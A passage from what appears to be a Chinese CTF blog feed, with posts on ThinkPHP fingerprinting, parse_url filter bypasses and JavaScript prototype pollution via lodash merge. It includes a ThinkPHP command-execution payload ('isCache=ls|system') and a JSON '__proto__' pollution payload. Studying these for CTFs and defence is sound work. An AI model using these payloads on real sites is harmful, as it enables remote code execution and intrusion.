随机字符串)。</p><p>4)相同函数在不同的PHP版本(大版本)中的实现代码可能是不一样 的。例如，在PHP7和PHP5中，mt_rand()函数的实现算法是完全不同 的。</p><p>5)计算机中不存在真正的随机数，这是mt_rand()函数存在安全问题的 根本原因。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tp漏洞</title>
      <link href="/posts/3b315222.html"/>
      <url>/posts/3b315222.html</url>
      
        <content type="html"><![CDATA[<h1 id="tp漏洞"><a href="#tp漏洞" class="headerlink" title="tp漏洞"></a>tp漏洞</h1><h2 id="一-识别tp框架-指纹"><a href="#一-识别tp框架-指纹" class="headerlink" title="一-识别tp框架(指纹)"></a>一-识别tp框架(指纹)</h2><h3 id="1-1-ioc判断"><a href="#1-1-ioc判断" class="headerlink" title="1.1 ioc判断"></a>1.1 ioc判断</h3><p>/favicon.ico</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20516b1e8de85b6b95343771b66b44df.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125193711067.png" alt="image-20241125193711067"></p><h3 id="1-2报错"><a href="#1-2报错" class="headerlink" title="1.2报错"></a>1.2报错</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1c8c509ef3f760f24376d38f6a7625c8.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3b4ccc2eacbbf6163c0ef584d7aeb544.png" alt="img"></p><p>或者 /index.php/index/index/1</p><h3 id="1-3错误传参"><a href="#1-3错误传参" class="headerlink" title="1.3错误传参"></a>1.3错误传参</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/479046ae0c8bf91e2d32d17acc474db9.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ebf2fd7c4ce6bf62b49083a7085bd599.png" alt="img"></p><h3 id="1-4特殊指纹出现logo"><a href="#1-4特殊指纹出现logo" class="headerlink" title="1.4特殊指纹出现logo"></a>1.4特殊指纹出现logo</h3><p>/?c=4e5e5d7364f443e28fbf0d3ae744a59a</p><p>/4e5e5d7364f443e28fbf0d3ae744a59a</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3ddc4ccf08674da045f360091d24546e.png" alt="img"></p><p>p3.1和3.2版本</p><p>4e5e5d7364f443e28fbf0d3ae744a59a-index.html</p><h3 id="1-5-body特征"><a href="#1-5-body特征" class="headerlink" title="1.5 body特征"></a>1.5 body特征</h3><p>body里有”十年磨一剑” 或者”ThinkPHP”</p><h3 id="1-6插件"><a href="#1-6插件" class="headerlink" title="1.6插件"></a>1.6插件</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0684f3dbf50af3128a16c0a775d03eb4.png" alt="img"></p><h2 id="二、利用方法"><a href="#二、利用方法" class="headerlink" title="二、利用方法"></a>二、利用方法</h2><p>数据通过竖线分开, 前面为参数, 后面为函数。例如：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?cacheTime=<span class="number">0</span>&amp;isCache=<span class="keyword">ls</span>|<span class="built_in">system</span>  </span><br><span class="line">/<span class="built_in">index</span>.php/?cacheTime=<span class="number">0</span>&amp;isCache=<span class="keyword">ls</span>|<span class="built_in">system</span>   #上面不行就换下面</span><br></pre></td></tr></table></figure><p>根据 thinkphp 的路由规则：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于ThinkPHP存在两种路由规则，如下所示</span><br><span class="line"><span class="link">http://serverName/index.php/模块/控制器/操作/</span>[<span class="string">参数名/参数值...</span>]</span><br><span class="line">如果不支持PATHINFO的服务器可以使用兼容模式访问如下：</span><br><span class="line"><span class="link">http://serverName/index.php?s=/模块/控制器/操作/</span>[<span class="string">参数名/参数值...</span>]</span><br><span class="line">也可采用 index.php/a/b/c/$&#123;code&#125;一下形式。</span><br></pre></td></tr></table></figure><p>访问 <code>/index.php/index/index</code>，能够走到题目给出的<code>Index\index</code>里。</p><p>所以一般要先加上路由路径。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>parse_url函数</title>
      <link href="/posts/f885edb3.html"/>
      <url>/posts/f885edb3.html</url>
      
        <content type="html"><![CDATA[<p>parse_url函数<br>作用：parse_url — 解析 URL，返回其组成部分</p><p>mixed parse_url ( string $url [, int $component = -1 ] )<br>本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</p><p>参数：<br>url：要解析的 URL。无效字符将使用 _ 来替换。</p><p>component：<br>指定 PHP_URL_SCHEME、 PHP_URL_HOST、 PHP_URL_PORT、 PHP_URL_USER、 PHP_URL_PASS、 PHP_URL_PATH、PHP_URL_QUERY 或 PHP_URL_FRAGMENT 的其中一个来获取 URL 中指定的部分的 string。 （除了指定为PHP_URL_PORT 后，将返回一个 integer 的值）。</p><p>对严重不合格的 URL，parse_url() 可能会返回 FALSE （CTF常用 返回值False 用于逃逸判断）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DEMO</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里我们还输出了当前$url的PHP_URL_PATH 发现是 /path<br>那么如果我们这里把$url中的/path去掉 发现输出的则为 NULL</p><p>tips：parse_url()会把//认为是相对路径（5.4.7以前）<br>如果我们</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;//www.example.com/path?googleguy=googley&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 在 5.4.7 之前这会输出路径 &quot;//www.example.com/path&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2016asisctf的一道web题-DEMO1"><a href="#2016asisctf的一道web题-DEMO1" class="headerlink" title="2016asisctf的一道web题 DEMO1"></a>2016asisctf的一道web题 DEMO1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$filter</span>=<span class="keyword">array</span>(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;qqqq&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$filter</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$f</span>.<span class="string">&quot;/i&quot;</span>, <span class="variable">$data</span>[<span class="string">&#x27;query&#x27;</span>]))</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Attack Detected&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8493b71d2534228680bc92134d48817d.png" alt="img"></p><p>这里query中的参数有aaa 被preg_match匹配到 所以拦截了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/260d79001d32b5306fb9f046839ee920.png" alt="img"></p><p>这里test.php前面加了一个/ 导致把test.php? 认为成了host 相对的来说 /aaa/xxx 也就成为了路径 这也可以说是一个绕过吧</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a6c48f242ca38058c92a1bc195e6c365.png" alt="img"></p><p>这里test.php前面再多加了一个/ 导致 严重不合格的 URL，parse_url() 返回FALSE 这个是通用的绕过方法</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解 JavaScript Prototype 污染攻击</title>
      <link href="/posts/575ed4b2.html"/>
      <url>/posts/575ed4b2.html</url>
      
        <content type="html"><![CDATA[<h1 id="深入理解-JavaScript-Prototype-污染攻击"><a href="#深入理解-JavaScript-Prototype-污染攻击" class="headerlink" title="深入理解 JavaScript Prototype 污染攻击"></a>深入理解 JavaScript Prototype 污染攻击</h1><h2 id="1、prototype和-proto-分别是什么？"><a href="#1、prototype和-proto-分别是什么？" class="headerlink" title="1、prototype和__proto__分别是什么？"></a>1、<code>prototype</code>和<code>__proto__</code>分别是什么？</h2><p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Foo()</span><br></pre></td></tr></table></figure><p><code>Foo</code>函数的内容，就是<code>Foo</code>类的构造函数，而<code>this.bar</code>就是<code>Foo</code>类的一个属性。</p><blockquote><p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</p></blockquote><p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure><p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p><p>我希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.png"><img src="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.0dcd4f4c4400.png" alt="image.png"></a></p><p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p><p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p><p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__ <span class="operator">=</span><span class="operator">=</span> Foo.prototype</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/3c4ed224-ae7b-4c8c-b16d-12b56524efee.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3c4ed224-ae7b-4c8c-b16d-12b56524efee.e270c75493b0.png" alt="image.png"></a></p><p>所以，总结一下：</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li></ol><h2 id="0x02-JavaScript原型链继承"><a href="#0x02-JavaScript原型链继承" class="headerlink" title="0x02 JavaScript原型链继承"></a><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">0x02 JavaScript原型链继承</a></h2><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p><p>比如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p><p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li></ol><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/08c5d5d0-62da-40f9-9e2c-77831fa7488e.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/08c5d5d0-62da-40f9-9e2c-77831fa7488e.51324dd04eef.png" alt="image.png"></a></p><p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p><p>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p><ol><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li>JavaScript使用prototype链实现继承机制</li></ol><h2 id="0x03-原型链污染是什么"><a href="#0x03-原型链污染是什么" class="headerlink" title="0x03 原型链污染是什么"></a><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x03">0x03 原型链污染是什么</a></h2><p>第一章中说到，<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p><p>做个简单的实验：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line">let foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line">let zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(zoo.bar)</span><br></pre></td></tr></table></figure><p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/4b63f1ef-6ed8-4448-9644-f11620822aaf.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4b63f1ef-6ed8-4448-9644-f11620822aaf.2b2425c31fdb.png" alt="image.png"></a></p><p>原因也显而易见：因为前面我们修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p><p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><h2 id="0x04-哪些情况下原型链会被污染？"><a href="#0x04-哪些情况下原型链会被污染？" class="headerlink" title="0x04 哪些情况下原型链会被污染？"></a><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x04">0x04 哪些情况下原型链会被污染？</a></h2><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p><p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><p>以对象merge为例，我们想象一个简单的merge函数：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function <span class="keyword">merge</span>(target, source) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> <span class="keyword">key</span> <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">key</span> <span class="keyword">in</span> source &amp;&amp; <span class="keyword">key</span> <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="keyword">merge</span>(target[<span class="keyword">key</span>], source[<span class="keyword">key</span>])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[<span class="keyword">key</span>] = source[<span class="keyword">key</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p><p>我们用如下代码实验一下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = &#123;<span class="selector-tag">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="selector-tag">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="function"><span class="title">merge</span><span class="params">(o1, o2)</span></span></span><br><span class="line">console<span class="selector-class">.log</span>(o1<span class="selector-class">.a</span>, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console<span class="selector-class">.log</span>(o3.b)</span><br></pre></td></tr></table></figure><p>结果是，合并虽然成功了，但原型链没有被污染：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/ba16d965-3112-4f69-bf5e-4eddb034e6dc.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ba16d965-3112-4f69-bf5e-4eddb034e6dc.c5e82ea6e4f5.png" alt="image.png"></a></p><p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p><p>我们将代码改成如下：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = JSON.parse(&#x27;&#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;b&quot;</span>: <span class="number">2</span>&#125;&#125;&#x27;)</span><br><span class="line"><span class="function"><span class="title">merge</span><span class="params">(o1, o2)</span></span></span><br><span class="line"><span class="function"><span class="title">console</span>.<span class="title">log</span><span class="params">(o1.a, o1.b)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">o3</span> = &#123;&#125;</span></span><br><span class="line"><span class="function"><span class="title">console</span>.<span class="title">log</span><span class="params">(o3.b)</span></span></span><br></pre></td></tr></table></figure><p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.64db1b9bbae7.png" alt="image.png"></a></p><p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p><h2 id="0x05-Code-Breaking-2018-Thejs-分析"><a href="#0x05-Code-Breaking-2018-Thejs-分析" class="headerlink" title="0x05 Code-Breaking 2018 Thejs 分析"></a><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x05-code-breaking-2018-thejs">0x05 Code-Breaking 2018 Thejs 分析</a></h2><p>我在Code-Breaking 2018中出了一道原型链污染的CTF题目，为了更加贴合真实环境，我没有刻意加太多自己的代码，后端主要代码如下（完整代码可参考<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">这里</a>）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>)</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;ejs&#x27;</span>, <span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) &#123; </span><br><span class="line"><span class="comment">// define the template engine</span></span><br><span class="line">    fs.<span class="title function_">readFile</span>(filePath, <span class="function">(<span class="params">err, content</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.<span class="title function_">template</span>(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = <span class="title function_">compiled</span>(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.<span class="property">session</span>.<span class="property">data</span> || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        data = lodash.<span class="title function_">merge</span>(data, req.<span class="property">body</span>)</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title 